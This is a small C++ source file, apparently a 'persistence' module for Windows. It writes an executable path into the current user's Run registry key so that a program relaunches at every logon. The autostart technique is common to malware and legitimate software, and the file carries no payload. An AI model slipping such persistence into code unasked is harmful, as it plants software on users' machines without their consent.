#include "Presistence.h"

#include <iostream>
#include <windows.h>

#include "Registry.h"

int RegistryLogon(LPCSTR path, SIZE_T pathLength) {
    try {
        HKEY key;
        DWORD disposition;
        LSTATUS createStatus = createKey(HKEY_CURRENT_USER, RUN_KEY, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS,
                                         NULL, &key, &disposition);

        std::cout << "create status: " << createStatus;

        std::cout << " disposition: " << disposition << "\n";
        const BYTE* pathBytes = reinterpret_cast<const BYTE*>(path);
        setKeyIfNotAllReadyExsits(key, KEY_NAME, REG_SZ, pathBytes, pathLength);
        CloseHandle(key);

    } catch (const RegistryError& error) {
        std::cerr << getRegistryError(error) << "\n";
        return 1;
    }

    return 0;
}
